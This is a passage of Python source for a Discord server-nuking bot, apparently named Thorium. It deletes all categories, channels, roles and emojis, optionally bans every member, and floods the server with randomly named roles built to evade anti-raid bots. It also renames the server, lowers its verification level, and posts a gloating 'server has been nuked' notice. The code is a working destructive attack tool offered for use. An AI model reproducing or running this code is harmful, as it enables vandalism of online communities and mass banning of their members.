                try:  
                    await category.delete()
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{category.name} (✓)" + Fore.RESET)
                except:
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{category} (X)" + Fore.RESET)
            print("----------------------------------------->")
                    
            print("----------------------------------------->")
            time.sleep(0.15)
            print("deleting channels...")
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{channel.name} (✓)" + Fore.RESET)
                except:
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{channel} (X)" + Fore.RESET)
            print("----------------------------------------->")
                   
            print("----------------------------------------->")
            time.sleep(0.15)
            print("deleting roles...")
            for role in ctx.guild.roles:  
                try:  
                    await role.delete()
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{role.name} (✓)" + Fore.RESET)
                except:
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{role} (X)" + Fore.RESET)
            print("----------------------------------------->")
            from config import auto_ban
            if auto_ban == True:
                time.sleep(0.15)
                print("ban all members...")
                for member in ctx.guild.members:
                    try:
                        await member.ban()
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{member.name} (✓)" + Fore.RESET)
                    except:
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{member} (X)" + Fore.RESET)
            print("----------------------------------------->")
            time.sleep(0.15)
            print("deleting emojis...")
            for emoji in ctx.guild.emojis: 
                try:  
                    await emoji.delete()
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{emoji.name} (✓)" + Fore.RESET)
                except:
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{emoji} (X)" + Fore.RESET)
            print("----------------------------------------->")
            for i in range (10):
                r1 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r2 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r3 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r4 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r5 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r6 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r7 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r8 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r9 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r10 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r11 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r12 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r13 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r14 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r15 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r16 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])

                if Antiraidbotbypass == True:
                    rolename = r1 + r10 + r2 + r11 + r3 + r12 + r4 + r13 + r5 + r14 + r6 + r15 + r7 + r16 + r8 + r9
                    rolenameprint = r1 + "⚠" + r2 + "⚠" + r3 + "⚠" + r4 + "⚠" + r5 + "⚠" + r6 + "⚠" + r7 + "⚠" + r8 + "⚠"
                    
                if rainbow == 1:
                    await guild.create_role(name=rolename, colour=discord.Colour(0xff0000)) 
                if rainbow == 2:
                    await guild.create_role(name=rolename, colour=discord.Colour(0xff8000)) 
                if rainbow == 3:
                    await guild.create_role(name=rolename, colour=discord.Colour(0xffff00)) 
                if rainbow == 4:
                    await guild.create_role(name=rolename, colour=discord.Colour(0x80ff00)) 
                if rainbow == 5:
                    await guild.create_role(name=rolename, colour=discord.Colour(0x00ff00)) 
                if rainbow == 6:
                    await guild.create_role(name=rolename, colour=discord.Colour(0x00ff80))
                if rainbow == 7:
                    await guild.create_role(name=rolename, colour=discord.Colour(0x00ffff)) 
                if rainbow == 8:
                    await guild.create_role(name=rolename, colour=discord.Colour(0x0080ff)) 
                if rainbow == 9:
                    await guild.create_role(name=rolename, colour=discord.Colour(0x0000ff)) 
                if rainbow == 10:
                    await guild.create_role(name=rolename, colour=discord.Colour(0x8000ff)) 
                if rainbow == 11:
                    await guild.create_role(name=rolename, colour=discord.Colour(0xff00ff)) 
                if rainbow == 12:
                    await guild.create_role(name=rolename, colour=discord.Colour(0xff0080)) 
                if rainbow == 13:
                    await guild.create_role(name=rolename, colour=discord.Colour(0xff0000)) 
                    rainbow = 0
                print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + " the role '" + rolenameprint + "' was created!")
                rainbow = rainbow + 1
                time.sleep(0.3)
                rainbow = 1
            Thorium_embed = discord.Embed(title="[Important Server Notification]", color=Embedcolor)
            Thorium_embed.add_field(name="[What happened?]", value="Im sorry to inform you that the server has been nuked by Thorium.", inline=False)
            Thorium_embed.add_field(name="[What is Thorium?]", value="Thorium is a nuking tool made by DummerGoki.\nIt is a powerful tool that can destroy discord servers quickly.\n[it is free and safe to use.]", inline=False)
            Thorium_embed.add_field(name="[What can you do?]", value="For your own safety,\nI recommend you to leave the server immediately if you have not been banned already.\n [Dummergoki is not responsible for any damage!]", inline=False)
            await ctx.guild.edit(name="Thorium on top!",icon=None,banner=None,verification_level=VerificationLevel.low)
            for i in range (10):
                r1 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r2 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r3 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r4 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r5 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
